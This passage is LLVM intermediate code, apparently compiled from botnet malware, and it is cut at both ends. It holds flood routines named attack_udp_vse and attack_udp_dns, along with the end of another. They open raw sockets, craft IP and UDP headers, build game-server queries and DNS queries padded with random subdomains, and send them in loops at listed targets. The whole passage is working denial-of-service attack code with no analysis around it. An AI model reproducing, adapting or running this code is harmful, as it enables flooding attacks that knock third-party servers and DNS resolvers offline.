  %80 = bitcast i8* %79 to i32*
  store i32 %78, i32* %80, align 4
  %81 = call zeroext i16 @htons(i16 zeroext %18) #10
  %82 = bitcast i8* %60 to i16*
  store i16 %81, i16* %82, align 2
  %83 = call zeroext i16 @htons(i16 zeroext %20) #10
  %84 = getelementptr inbounds i8, i8* %58, i64 22
  %85 = bitcast i8* %84 to i16*
  store i16 %83, i16* %85, align 2
  %86 = call zeroext i16 @htons(i16 zeroext %39) #10
  %87 = getelementptr inbounds i8, i8* %58, i64 24
  %88 = bitcast i8* %87 to i16*
  store i16 %86, i16* %88, align 2
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %89 = icmp slt i64 %indvars.iv.next, %40
  br i1 %89, label %57, label %..preheader_crit_edge

.loopexit.loopexit:                               ; preds = %123
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %36, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %123
  %storemerge8385 = phi i32 [ %144, %123 ], [ 0, %.lr.ph.preheader ]
  %90 = sext i32 %storemerge8385 to i64
  %91 = getelementptr inbounds i8*, i8** %8, i64 %90
  %92 = load i8*, i8** %91, align 8
  %93 = bitcast i8* %92 to %struct.iphdr*
  %94 = getelementptr inbounds i8, i8* %92, i64 20
  %95 = getelementptr inbounds i8, i8* %92, i64 28
  %96 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %90, i32 2
  %97 = load i8, i8* %96, align 4
  %98 = icmp ult i8 %97, 32
  br i1 %98, label %99, label %106

; <label>:99:                                     ; preds = %.lr.ph
  %100 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %90, i32 1
  %101 = load i32, i32* %100, align 4
  %102 = call i32 @ntohl(i32 %101) #10
  %103 = call i32 @htonl(i32 %102) #10
  %104 = getelementptr inbounds i8, i8* %92, i64 16
  %105 = bitcast i8* %104 to i32*
  store i32 %103, i32* %105, align 4
  br label %106

; <label>:106:                                    ; preds = %99, %.lr.ph
  br i1 %44, label %107, label %110

; <label>:107:                                    ; preds = %106
  %108 = getelementptr inbounds i8, i8* %92, i64 12
  %109 = bitcast i8* %108 to i32*
  store i32 0, i32* %109, align 4
  br label %110

; <label>:110:                                    ; preds = %107, %106
  br i1 %46, label %111, label %114

; <label>:111:                                    ; preds = %110
  %112 = getelementptr inbounds i8, i8* %92, i64 4
  %113 = bitcast i8* %112 to i16*
  store i16 0, i16* %113, align 4
  br label %114

; <label>:114:                                    ; preds = %111, %110
  br i1 %48, label %115, label %117

; <label>:115:                                    ; preds = %114
  %116 = bitcast i8* %94 to i16*
  store i16 0, i16* %116, align 2
  br label %117

; <label>:117:                                    ; preds = %115, %114
  br i1 %50, label %118, label %121

; <label>:118:                                    ; preds = %117
  %119 = getelementptr inbounds i8, i8* %92, i64 22
  %120 = bitcast i8* %119 to i16*
  store i16 0, i16* %120, align 2
  br label %121

; <label>:121:                                    ; preds = %118, %117
  br i1 %51, label %123, label %122

; <label>:122:                                    ; preds = %121
  call void @rand_str(i8* %95, i32 %56)
  br label %123

; <label>:123:                                    ; preds = %121, %122
  %124 = getelementptr inbounds i8, i8* %92, i64 10
  %125 = bitcast i8* %124 to i16*
  store i16 0, i16* %125, align 2
  %126 = bitcast i8* %92 to i16*
  %127 = call zeroext i16 @checksum_generic(i16* %126, i32 20) #9
  store i16 %127, i16* %125, align 2
  %128 = getelementptr inbounds i8, i8* %92, i64 26
  %129 = bitcast i8* %128 to i16*
  store i16 0, i16* %129, align 2
  %130 = getelementptr inbounds i8, i8* %92, i64 24
  %131 = bitcast i8* %130 to i16*
  %132 = load i16, i16* %131, align 2
  %133 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %93, i8* %94, i16 zeroext %132, i32 %54) #9
  store i16 %133, i16* %129, align 2
  %134 = getelementptr inbounds i8, i8* %92, i64 22
  %135 = bitcast i8* %134 to i16*
  %136 = load i16, i16* %135, align 2
  %137 = load i32, i32* %5, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %138, i32 0, i32 1
  store i16 %136, i16* %139, align 2
  %140 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %138, i32 0
  %141 = bitcast %struct.sockaddr_in* %140 to %struct.sockaddr*
  %142 = call i64 @sendto(i32 %29, i8* %92, i64 %55, i32 16384, %struct.sockaddr* %141, i32 16) #9
  %143 = load i32, i32* %5, align 4
  %144 = add nsw i32 %143, 1
  store i32 %144, i32* %5, align 4
  %145 = icmp slt i32 %144, %35
  br i1 %145, label %.lr.ph, label %.loopexit.loopexit

; <label>:146:                                    ; preds = %4, %41
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_vse(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = zext i8 %0 to i64
  %8 = tail call noalias i8* @calloc(i64 %7, i64 8) #9
  %9 = bitcast i8* %8 to i8**
  %10 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %11 = trunc i32 %10 to i8
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %13 = trunc i32 %12 to i16
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %15 = trunc i32 %14 to i8
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %17 = trunc i32 %16 to i8
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %19 = trunc i32 %18 to i16
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 27015)
  %21 = trunc i32 %20 to i16
  tail call void @table_unlock_val(i8 zeroext 29)
  %22 = call i8* @table_retrieve_val(i32 29, i32* nonnull %6)
  %23 = call i32 @socket(i32 2, i32 3, i32 17) #9
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %136, label %25

; <label>:25:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %26 = bitcast i32* %5 to i8*
  %27 = call i32 @setsockopt(i32 %23, i32 0, i32 3, i8* nonnull %26, i32 4) #9
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %32, label %.preheader71

.preheader71:                                     ; preds = %25
  store i32 0, i32* %5, align 4
  %29 = zext i8 %0 to i32
  %30 = icmp eq i8 %0, 0
  br i1 %30, label %.preheader, label %.lr.ph73

.lr.ph73:                                         ; preds = %.preheader71
  %31 = icmp eq i8 %17, 0
  br label %40

; <label>:32:                                     ; preds = %25
  %33 = call i32 @close(i32 %23) #9
  br label %136

.preheader.loopexit:                              ; preds = %62
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader71
  %34 = and i32 %12, 65535
  %35 = icmp eq i32 %34, 65535
  %36 = and i32 %18, 65535
  %37 = icmp eq i32 %36, 65535
  %38 = and i32 %20, 65535
  %39 = icmp eq i32 %38, 65535
  br label %.loopexit

; <label>:40:                                     ; preds = %.lr.ph73, %62
  %41 = phi i32 [ 0, %.lr.ph73 ], [ %83, %62 ]
  %42 = call noalias i8* @calloc(i64 128, i64 1) #9
  %43 = sext i32 %41 to i64
  %44 = getelementptr inbounds i8*, i8** %9, i64 %43
  store i8* %42, i8** %44, align 8
  %45 = getelementptr inbounds i8, i8* %42, i64 20
  %46 = getelementptr inbounds i8, i8* %42, i64 28
  store i8 69, i8* %42, align 4
  %47 = getelementptr inbounds i8, i8* %42, i64 1
  store i8 %11, i8* %47, align 1
  %48 = load i32, i32* %6, align 4
  %49 = trunc i32 %48 to i16
  %50 = add i16 %49, 32
  %51 = call zeroext i16 @htons(i16 zeroext %50) #10
  %52 = getelementptr inbounds i8, i8* %42, i64 2
  %53 = bitcast i8* %52 to i16*
  store i16 %51, i16* %53, align 2
  %54 = call zeroext i16 @htons(i16 zeroext %13) #10
  %55 = getelementptr inbounds i8, i8* %42, i64 4
  %56 = bitcast i8* %55 to i16*
  store i16 %54, i16* %56, align 4
  %57 = getelementptr inbounds i8, i8* %42, i64 8
  store i8 %15, i8* %57, align 4
  br i1 %31, label %62, label %58

; <label>:58:                                     ; preds = %40
  %59 = call zeroext i16 @htons(i16 zeroext 16384) #10
  %60 = getelementptr inbounds i8, i8* %42, i64 6
  %61 = bitcast i8* %60 to i16*
  store i16 %59, i16* %61, align 2
  br label %62

; <label>:62:                                     ; preds = %40, %58
  %63 = getelementptr inbounds i8, i8* %42, i64 9
  store i8 17, i8* %63, align 1
  %64 = load i32, i32* @LOCAL_ADDR, align 4
  %65 = getelementptr inbounds i8, i8* %42, i64 12
  %66 = bitcast i8* %65 to i32*
  store i32 %64, i32* %66, align 4
  %67 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %43, i32 1
  %68 = load i32, i32* %67, align 4
  %69 = getelementptr inbounds i8, i8* %42, i64 16
  %70 = bitcast i8* %69 to i32*
  store i32 %68, i32* %70, align 4
  %71 = call zeroext i16 @htons(i16 zeroext %19) #10
  %72 = bitcast i8* %45 to i16*
  store i16 %71, i16* %72, align 2
  %73 = call zeroext i16 @htons(i16 zeroext %21) #10
  %74 = getelementptr inbounds i8, i8* %42, i64 22
  %75 = bitcast i8* %74 to i16*
  store i16 %73, i16* %75, align 2
  %76 = add i16 %49, 12
  %77 = call zeroext i16 @htons(i16 zeroext %76) #10
  %78 = getelementptr inbounds i8, i8* %42, i64 24
  %79 = bitcast i8* %78 to i16*
  store i16 %77, i16* %79, align 2
  %80 = bitcast i8* %46 to i32*
  store i32 -1, i32* %80, align 4
  %81 = getelementptr inbounds i8, i8* %42, i64 32
  call void @util_memcpy(i8* %81, i8* %22, i32 %48) #9
  %82 = load i32, i32* %5, align 4
  %83 = add nsw i32 %82, 1
  store i32 %83, i32* %5, align 4
  %84 = icmp slt i32 %83, %29
  br i1 %84, label %40, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %._crit_edge
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %30, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %._crit_edge
  %storemerge7072 = phi i32 [ %134, %._crit_edge ], [ 0, %.lr.ph.preheader ]
  %85 = sext i32 %storemerge7072 to i64
  %86 = getelementptr inbounds i8*, i8** %9, i64 %85
  %87 = load i8*, i8** %86, align 8
  %88 = bitcast i8* %87 to %struct.iphdr*
  %89 = getelementptr inbounds i8, i8* %87, i64 20
  %90 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %85, i32 2
  %91 = load i8, i8* %90, align 4
  %92 = icmp ult i8 %91, 32
  br i1 %92, label %93, label %100

; <label>:93:                                     ; preds = %.lr.ph
  %94 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %85, i32 1
  %95 = load i32, i32* %94, align 4
  %96 = call i32 @ntohl(i32 %95) #10
  %97 = call i32 @htonl(i32 %96) #10
  %98 = getelementptr inbounds i8, i8* %87, i64 16
  %99 = bitcast i8* %98 to i32*
  store i32 %97, i32* %99, align 4
  br label %100

; <label>:100:                                    ; preds = %93, %.lr.ph
  br i1 %35, label %101, label %104

; <label>:101:                                    ; preds = %100
  %102 = getelementptr inbounds i8, i8* %87, i64 4
  %103 = bitcast i8* %102 to i16*
  store i16 0, i16* %103, align 4
  br label %104

; <label>:104:                                    ; preds = %101, %100
  br i1 %37, label %105, label %107

; <label>:105:                                    ; preds = %104
  %106 = bitcast i8* %89 to i16*
  store i16 0, i16* %106, align 2
  br label %107

; <label>:107:                                    ; preds = %105, %104
  %108 = getelementptr inbounds i8, i8* %87, i64 22
  %109 = bitcast i8* %108 to i16*
  br i1 %39, label %110, label %._crit_edge

; <label>:110:                                    ; preds = %107
  store i16 0, i16* %109, align 2
  br label %._crit_edge

._crit_edge:                                      ; preds = %107, %110
  %111 = getelementptr inbounds i8, i8* %87, i64 10
  %112 = bitcast i8* %111 to i16*
  store i16 0, i16* %112, align 2
  %113 = bitcast i8* %87 to i16*
  %114 = call zeroext i16 @checksum_generic(i16* %113, i32 20) #9
  store i16 %114, i16* %112, align 2
  %115 = getelementptr inbounds i8, i8* %87, i64 26
  %116 = bitcast i8* %115 to i16*
  store i16 0, i16* %116, align 2
  %117 = getelementptr inbounds i8, i8* %87, i64 24
  %118 = bitcast i8* %117 to i16*
  %119 = load i16, i16* %118, align 2
  %120 = load i32, i32* %6, align 4
  %121 = add i32 %120, 12
  %122 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %88, i8* %89, i16 zeroext %119, i32 %121) #9
  store i16 %122, i16* %116, align 2
  %123 = load i16, i16* %109, align 2
  %124 = load i32, i32* %5, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %125, i32 0, i32 1
  store i16 %123, i16* %126, align 2
  %127 = load i32, i32* %6, align 4
  %128 = sext i32 %127 to i64
  %129 = add nsw i64 %128, 32
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %125, i32 0
  %131 = bitcast %struct.sockaddr_in* %130 to %struct.sockaddr*
  %132 = call i64 @sendto(i32 %23, i8* %87, i64 %129, i32 16384, %struct.sockaddr* %131, i32 16) #9
  %133 = load i32, i32* %5, align 4
  %134 = add nsw i32 %133, 1
  store i32 %134, i32* %5, align 4
  %135 = icmp slt i32 %134, %29
  br i1 %135, label %.lr.ph, label %.loopexit.loopexit

; <label>:136:                                    ; preds = %4, %32
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_dns(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #9
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 53)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 9, i32 65535)
  %22 = trunc i32 %21 to i16
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 12)
  %24 = trunc i32 %23 to i8
  %25 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 8, i8* null)
  %26 = tail call fastcc i32 @get_dns_resolver()
  %27 = icmp eq i8* %25, null
  br i1 %27, label %179, label %28

; <label>:28:                                     ; preds = %4
  %29 = tail call i32 @util_strlen(i8* nonnull %25) #9
  %30 = tail call i32 @socket(i32 2, i32 3, i32 17) #9
  %31 = icmp eq i32 %30, -1
  br i1 %31, label %179, label %32

; <label>:32:                                     ; preds = %28
  store i32 1, i32* %5, align 4
  %33 = bitcast i32* %5 to i8*
  %34 = call i32 @setsockopt(i32 %30, i32 0, i32 3, i8* nonnull %33, i32 4) #9
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %50, label %.preheader122

.preheader122:                                    ; preds = %32
  store i32 0, i32* %5, align 4
  %36 = zext i8 %0 to i32
  %37 = icmp eq i8 %0, 0
  %.pre = and i32 %23, 255
  br i1 %37, label %.preheader122..preheader_crit_edge, label %.lr.ph130

.preheader122..preheader_crit_edge:               ; preds = %.preheader122
  %.pre133 = sext i32 %29 to i64
  br label %.preheader

.lr.ph130:                                        ; preds = %.preheader122
  %38 = zext i32 %.pre to i64
  %39 = sext i32 %29 to i64
  %40 = add nuw nsw i64 %38, 47
  %41 = add nsw i64 %40, %39
  %42 = trunc i64 %41 to i16
  %43 = icmp eq i8 %16, 0
  %44 = add nuw nsw i64 %38, 27
  %45 = add nsw i64 %44, %39
  %46 = trunc i64 %45 to i16
  %47 = add nsw i32 %29, 1
  %48 = icmp sgt i32 %29, 0
  %wide.trip.count = zext i32 %29 to i64
  %xtraiter = and i64 %wide.trip.count, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  %49 = icmp eq i32 %29, 1
  br label %64

; <label>:50:                                     ; preds = %32
  %51 = call i32 @close(i32 %30) #9
  br label %179

.preheader.loopexit:                              ; preds = %._crit_edge
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader122..preheader_crit_edge
  %.pre-phi134 = phi i64 [ %.pre133, %.preheader122..preheader_crit_edge ], [ %39, %.preheader.loopexit ]
  %52 = and i32 %11, 65535
  %53 = icmp eq i32 %52, 65535
  %54 = and i32 %17, 65535
  %55 = icmp eq i32 %54, 65535
  %56 = and i32 %19, 65535
  %57 = icmp eq i32 %56, 65535
  %58 = and i32 %21, 65535
  %59 = icmp eq i32 %58, 65535
  %60 = add nuw nsw i32 %.pre, 27
  %61 = add i32 %60, %29
  %addconv132 = add nuw nsw i32 %.pre, 47
  %62 = zext i32 %addconv132 to i64
  %63 = add nsw i64 %62, %.pre-phi134
  br label %.loopexit

; <label>:64:                                     ; preds = %.lr.ph130, %._crit_edge
  %65 = phi i32 [ 0, %.lr.ph130 ], [ %133, %._crit_edge ]
  %66 = call noalias i8* @calloc(i64 600, i64 1) #9
  %67 = sext i32 %65 to i64
  %68 = getelementptr inbounds i8*, i8** %8, i64 %67
  store i8* %66, i8** %68, align 8
  %69 = getelementptr inbounds i8, i8* %66, i64 20
  %70 = getelementptr inbounds i8, i8* %66, i64 28
  %71 = getelementptr inbounds i8, i8* %66, i64 40
  store i8 69, i8* %66, align 4
  %72 = getelementptr inbounds i8, i8* %66, i64 1
  store i8 %10, i8* %72, align 1
  %73 = call zeroext i16 @htons(i16 zeroext %42) #10
  %74 = getelementptr inbounds i8, i8* %66, i64 2
  %75 = bitcast i8* %74 to i16*
  store i16 %73, i16* %75, align 2
  %76 = call zeroext i16 @htons(i16 zeroext %12) #10
  %77 = getelementptr inbounds i8, i8* %66, i64 4
  %78 = bitcast i8* %77 to i16*
  store i16 %76, i16* %78, align 4
  %79 = getelementptr inbounds i8, i8* %66, i64 8
  store i8 %14, i8* %79, align 4
  br i1 %43, label %84, label %80

; <label>:80:                                     ; preds = %64
  %81 = call zeroext i16 @htons(i16 zeroext 16384) #10
  %82 = getelementptr inbounds i8, i8* %66, i64 6
  %83 = bitcast i8* %82 to i16*
  store i16 %81, i16* %83, align 2
  br label %84

; <label>:84:                                     ; preds = %64, %80
  %85 = getelementptr inbounds i8, i8* %66, i64 9
  store i8 17, i8* %85, align 1
  %86 = load i32, i32* @LOCAL_ADDR, align 4
  %87 = getelementptr inbounds i8, i8* %66, i64 12
  %88 = bitcast i8* %87 to i32*
  store i32 %86, i32* %88, align 4
  %89 = getelementptr inbounds i8, i8* %66, i64 16
  %90 = bitcast i8* %89 to i32*
  store i32 %26, i32* %90, align 4
  %91 = call zeroext i16 @htons(i16 zeroext %18) #10
  %92 = bitcast i8* %69 to i16*
  store i16 %91, i16* %92, align 2
  %93 = call zeroext i16 @htons(i16 zeroext %20) #10
  %94 = getelementptr inbounds i8, i8* %66, i64 22
  %95 = bitcast i8* %94 to i16*
  store i16 %93, i16* %95, align 2
  %96 = call zeroext i16 @htons(i16 zeroext %46) #10
  %97 = getelementptr inbounds i8, i8* %66, i64 24
  %98 = bitcast i8* %97 to i16*
  store i16 %96, i16* %98, align 2
  %99 = call zeroext i16 @htons(i16 zeroext %22) #10
  %100 = bitcast i8* %70 to i16*
  store i16 %99, i16* %100, align 2
  %101 = call zeroext i16 @htons(i16 zeroext 256) #10
  %102 = getelementptr inbounds i8, i8* %66, i64 30
  %103 = bitcast i8* %102 to i16*
  store i16 %101, i16* %103, align 2
  %104 = call zeroext i16 @htons(i16 zeroext 1) #10
  %105 = getelementptr inbounds i8, i8* %66, i64 32
  %106 = bitcast i8* %105 to i16*
  store i16 %104, i16* %106, align 2
  %107 = getelementptr inbounds i8, i8* %66, i64 41
  store i8 %24, i8* %71, align 1
  %108 = getelementptr inbounds i8, i8* %107, i64 %38
  %109 = getelementptr inbounds i8, i8* %108, i64 1
  call void @util_memcpy(i8* %109, i8* nonnull %25, i32 %47) #9
  br i1 %48, label %.lr.ph128.preheader, label %._crit_edge

.lr.ph128.preheader:                              ; preds = %84
  br i1 %lcmp.mod, label %.lr.ph128.prol.loopexit.unr-lcssa, label %.lr.ph128.prol.preheader

.lr.ph128.prol.preheader:                         ; preds = %.lr.ph128.preheader
  br label %.lr.ph128.prol

.lr.ph128.prol:                                   ; preds = %.lr.ph128.prol.preheader
  %110 = load i8, i8* %25, align 1
  %111 = icmp eq i8 %110, 46
  br i1 %111, label %113, label %112

; <label>:112:                                    ; preds = %.lr.ph128.prol
  br label %115

; <label>:113:                                    ; preds = %.lr.ph128.prol
  store i8 0, i8* %108, align 1
  %114 = getelementptr inbounds i8, i8* %108, i64 1
  br label %115

; <label>:115:                                    ; preds = %113, %112
  %.1119.prol = phi i8* [ %114, %113 ], [ %108, %112 ]
  %.1.prol = phi i8 [ 0, %113 ], [ 1, %112 ]
  br label %.lr.ph128.prol.loopexit.unr-lcssa

.lr.ph128.prol.loopexit.unr-lcssa:                ; preds = %.lr.ph128.preheader, %115
  %.1119.lcssa.unr.ph = phi i8* [ %.1119.prol, %115 ], [ undef, %.lr.ph128.preheader ]
  %.1.lcssa.unr.ph = phi i8 [ %.1.prol, %115 ], [ undef, %.lr.ph128.preheader ]
  %indvars.iv.unr.ph = phi i64 [ 1, %115 ], [ 0, %.lr.ph128.preheader ]
  %.0115126.unr.ph = phi i8 [ %.1.prol, %115 ], [ 0, %.lr.ph128.preheader ]
  %.0118124.unr.ph = phi i8* [ %.1119.prol, %115 ], [ %108, %.lr.ph128.preheader ]
  br label %.lr.ph128.prol.loopexit

.lr.ph128.prol.loopexit:                          ; preds = %.lr.ph128.prol.loopexit.unr-lcssa
  br i1 %49, label %._crit_edge.loopexit, label %.lr.ph128.preheader.new

.lr.ph128.preheader.new:                          ; preds = %.lr.ph128.prol.loopexit
  br label %.lr.ph128

.lr.ph128:                                        ; preds = %185, %.lr.ph128.preheader.new
  %indvars.iv = phi i64 [ %indvars.iv.unr.ph, %.lr.ph128.preheader.new ], [ %indvars.iv.next.1, %185 ]
  %.0115126 = phi i8 [ %.0115126.unr.ph, %.lr.ph128.preheader.new ], [ %.1.1, %185 ]
  %.0118124 = phi i8* [ %.0118124.unr.ph, %.lr.ph128.preheader.new ], [ %.1119.1, %185 ]
  %116 = getelementptr inbounds i8, i8* %25, i64 %indvars.iv
  %117 = load i8, i8* %116, align 1
  %118 = icmp eq i8 %117, 46
  br i1 %118, label %119, label %122

; <label>:119:                                    ; preds = %.lr.ph128
  store i8 %.0115126, i8* %.0118124, align 1
  %120 = getelementptr inbounds i8, i8* %108, i64 %indvars.iv
  %121 = getelementptr inbounds i8, i8* %120, i64 1
  br label %.lr.ph128.1135

; <label>:122:                                    ; preds = %.lr.ph128
  %123 = add i8 %.0115126, 1
  br label %.lr.ph128.1135

.lr.ph128.1135:                                   ; preds = %119, %122
  %.1119 = phi i8* [ %121, %119 ], [ %.0118124, %122 ]
  %.1 = phi i8 [ 0, %119 ], [ %123, %122 ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %124 = getelementptr inbounds i8, i8* %25, i64 %indvars.iv.next
  %125 = load i8, i8* %124, align 1
  %126 = icmp eq i8 %125, 46
  br i1 %126, label %182, label %180

._crit_edge.loopexit.unr-lcssa:                   ; preds = %185
  br label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph128.prol.loopexit, %._crit_edge.loopexit.unr-lcssa
  %.1119.lcssa = phi i8* [ %.1119.lcssa.unr.ph, %.lr.ph128.prol.loopexit ], [ %.1119.1, %._crit_edge.loopexit.unr-lcssa ]
  %.1.lcssa = phi i8 [ %.1.lcssa.unr.ph, %.lr.ph128.prol.loopexit ], [ %.1.1, %._crit_edge.loopexit.unr-lcssa ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %84
  %.0118.lcssa = phi i8* [ %108, %84 ], [ %.1119.lcssa, %._crit_edge.loopexit ]
  %.0115.lcssa = phi i8 [ 0, %84 ], [ %.1.lcssa, %._crit_edge.loopexit ]
  store i8 %.0115.lcssa, i8* %.0118.lcssa, align 1
  %127 = getelementptr inbounds i8, i8* %108, i64 %39
  %128 = getelementptr inbounds i8, i8* %127, i64 2
  %129 = bitcast i8* %128 to i16*
  store i16 %104, i16* %129, align 2
  %130 = getelementptr inbounds i8, i8* %128, i64 2
  %131 = bitcast i8* %130 to i16*
  store i16 %104, i16* %131, align 2
  %132 = load i32, i32* %5, align 4
  %133 = add nsw i32 %132, 1
  store i32 %133, i32* %5, align 4
  %134 = icmp slt i32 %133, %36
  br i1 %134, label %64, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %155
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %37, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %155
  %storemerge120123 = phi i32 [ %177, %155 ], [ 0, %.lr.ph.preheader ]
  %135 = sext i32 %storemerge120123 to i64
  %136 = getelementptr inbounds i8*, i8** %8, i64 %135
  %137 = load i8*, i8** %136, align 8
  %138 = bitcast i8* %137 to %struct.iphdr*
  %139 = getelementptr inbounds i8, i8* %137, i64 20
  %140 = getelementptr inbounds i8, i8* %137, i64 28
  %141 = getelementptr inbounds i8, i8* %137, i64 41
  br i1 %53, label %142, label %145

; <label>:142:                                    ; preds = %.lr.ph
  %143 = getelementptr inbounds i8, i8* %137, i64 4
  %144 = bitcast i8* %143 to i16*
  store i16 0, i16* %144, align 4
  br label %145

; <label>:145:                                    ; preds = %142, %.lr.ph
  br i1 %55, label %146, label %148

; <label>:146:                                    ; preds = %145
  %147 = bitcast i8* %139 to i16*
  store i16 0, i16* %147, align 2
  br label %148

; <label>:148:                                    ; preds = %146, %145
  br i1 %57, label %149, label %152

; <label>:149:                                    ; preds = %148
  %150 = getelementptr inbounds i8, i8* %137, i64 22
  %151 = bitcast i8* %150 to i16*
  store i16 0, i16* %151, align 2
  br label %152

; <label>:152:                                    ; preds = %149, %148
  br i1 %59, label %153, label %155

; <label>:153:                                    ; preds = %152
  %154 = bitcast i8* %140 to i16*
  store i16 0, i16* %154, align 2
  br label %155

; <label>:155:                                    ; preds = %153, %152
  call void @rand_alphastr(i8* %141, i32 %.pre)
  %156 = getelementptr inbounds i8, i8* %137, i64 10
  %157 = bitcast i8* %156 to i16*
  store i16 0, i16* %157, align 2
  %158 = bitcast i8* %137 to i16*
  %159 = call zeroext i16 @checksum_generic(i16* %158, i32 20) #9
  store i16 %159, i16* %157, align 2
  %160 = getelementptr inbounds i8, i8* %137, i64 26
  %161 = bitcast i8* %160 to i16*
  store i16 0, i16* %161, align 2
  %162 = getelementptr inbounds i8, i8* %137, i64 24
  %163 = bitcast i8* %162 to i16*
  %164 = load i16, i16* %163, align 2
  %165 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %138, i8* %139, i16 zeroext %164, i32 %61) #9
  store i16 %165, i16* %161, align 2
  %166 = load i32, i32* %5, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %167, i32 0, i32 2, i32 0
  store i32 %26, i32* %168, align 4
  %169 = getelementptr inbounds i8, i8* %137, i64 22
  %170 = bitcast i8* %169 to i16*
  %171 = load i16, i16* %170, align 2
  %172 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %167, i32 0, i32 1
  store i16 %171, i16* %172, align 2
  %173 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %167, i32 0
  %174 = bitcast %struct.sockaddr_in* %173 to %struct.sockaddr*
  %175 = call i64 @sendto(i32 %30, i8* %137, i64 %63, i32 16384, %struct.sockaddr* %174, i32 16) #9
  %176 = load i32, i32* %5, align 4
  %177 = add nsw i32 %176, 1
  store i32 %177, i32* %5, align 4
  %178 = icmp slt i32 %177, %36
